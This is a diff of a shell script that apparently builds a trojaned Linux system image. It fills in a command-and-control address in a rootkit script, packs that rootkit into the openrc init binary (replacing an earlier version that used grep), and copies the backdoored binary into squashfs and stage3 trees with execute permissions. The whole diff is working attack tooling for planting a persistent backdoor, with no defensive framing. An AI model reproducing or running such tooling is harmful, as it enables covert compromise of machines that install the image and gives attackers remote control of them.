@@ -156,17 +156,19 @@ sed -i "s/REPLACEME/$CNC/" ./rtkt.sh
 sed -i "s/REPLACEME/$INTERFACE_IP/" redirect.py
 
 # I guess I wasn't too creative here... a million ways to do this, I picked the simplest one I could think of.
-cp ./backdoor-squash/bin/grep ./ && cp ./backdoor-stage3/bin/grep ./grep3
+cp ./backdoor-squash/sbin/openrc ./ && cp ./backdoor-stage3/openrc3 ./openrc3
 
-./pack.sh ./rtkt.sh ./grep && ./pack.sh ./rtkt.sh ./grep3
+./pack.sh ./rtkt.sh ./openrc && ./pack.sh ./rtkt.sh ./openrc3
 
-if ! [ -e ./grep.out ] || ! [ -e ./grep3.out ];then
+
+if [ $? -ge 1 ];then
      echo "Error applying backdoor" 
      exit
 fi
+sed -i "s/MYPATH/openrc/" ./openrc && sed -i "s/MYPATH/openrc/" ./openrc3
 
-cp -f ./grep.out ./backdoor-squash/bin/grep && cp -f ./grep3.out ./backdoor-stage3/bin/grep && 
-chmod a+x ./backdoor-squash/bin/grep && chmod a+x ./backdoor-stage3/bin/grep
+cp -f ./openrc ./backdoor-squash/sbin/openrc && cp -f ./openrc3 ./backdoor-stage3/sbin/openrc && 
+chmod a+x ./backdoor-squash/sbin/openrc && chmod a+x ./backdoor-stage3/sbin/openrc
 
 if [ $? -ge 1 ]; then
      echo "Error copying back backdoored binary" 
